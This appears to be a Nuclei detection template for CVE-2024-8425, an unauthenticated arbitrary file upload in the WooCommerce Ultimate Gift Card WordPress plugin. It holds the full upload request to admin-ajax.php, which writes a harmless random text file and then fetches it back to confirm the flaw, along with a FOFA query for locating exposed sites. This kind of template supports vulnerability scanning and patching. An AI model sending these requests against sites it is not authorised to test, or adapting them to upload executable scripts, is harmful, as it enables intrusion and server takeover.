flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "{{file_message}}&name={{filename}}")
    internal: true
    type: dsl
  matchers-condition: and
  raw:
  - 'POST /wp-admin/admin-ajax.php?action=mwb_wgm_preview_mail HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{boundary_id}}


    ------WebKitFormBoundary{{boundary_id}}

    Content-Disposition: form-data; name="mwb_wgm_preview_email"


    test

    ------WebKitFormBoundary{{boundary_id}}

    Content-Disposition: form-data; name="tempId"


    1

    ------WebKitFormBoundary{{boundary_id}}

    Content-Disposition: form-data; name="message"


    {{file_message}}

    ------WebKitFormBoundary{{boundary_id}}

    Content-Disposition: form-data; name="file"; filename="{{filename}}"

    Content-Type: image/jpeg


    {{file_content}}

    ------WebKitFormBoundary{{boundary_id}}--

    '
- extractors:
  - kval:
    - file_content
    type: kval
  matchers:
  - part: body
    type: word
    words:
    - '{{file_content}}'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /wp-content/uploads/mwb_browse/{{filename}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-8425
info:
  author: jsnv-dev
  classification:
    cpe: cpe:2.3:a:wpswings:woocommerce_ultimate_gift_card:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2024-8425
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-434
    epss-percentile: 0.98283
    epss-score: 0.62585
  description: 'The WooCommerce Ultimate Gift Card plugin for WordPress is vulnerable
    to arbitrary file uploads due to insufficient file type validation in the ''mwb_wgm_preview_mail''
    and ''mwb_wgm_woocommerce_add_cart_item_data'' functions in all versions up to,
    and including, 2.6.0. This makes it possible for unauthenticated attackers to
    upload arbitrary files on the affected site''s server which may make remote code
    execution possible.

    '
  impact: 'Unauthenticated attackers can upload arbitrary files including PHP scripts
    to the server through insufficient file type validation, enabling remote code
    execution and complete server compromise.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/woocommerce-ultimate-gift-card"
    max-request: 2
    product: woocommerce_ultimate_gift_card
    vendor: wpswings
    verified: true
  name: "WooCommerce Ultimate Gift Card \u2264 2.6.0 - Arbitrary File Upload"
  reference:
  - https://github.com/KTN1990/CVE-2024-8425
  - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/woocommerce-ultimate-gift-card/woocommerce-ultimate-gift-card-260-unauthenticated-arbitrary-file-upload
  - https://nvd.nist.gov/vuln/detail/CVE-2024-8425
  remediation: 'Update WooCommerce Ultimate Gift Card plugin to a version later than
    2.6.0 that addresses the arbitrary file upload vulnerability in the mwb_wgm_preview_mail
    and mwb_wgm_woocommerce_add_cart_item_data functions.

    '
  severity: critical
  tags: cve,cve2024,wp,wp-plugin,wordpress,woocommerce,woocommerce-ultimate-gift-card,file-upload,vkev,vuln
variables:
  boundary_id: '{{rand_int(100000,999999)}}'
  file_content: '{{randstr}}'
  file_message: '{{randstr}}'
  filename: '{{rand_base(7)}}.txt'
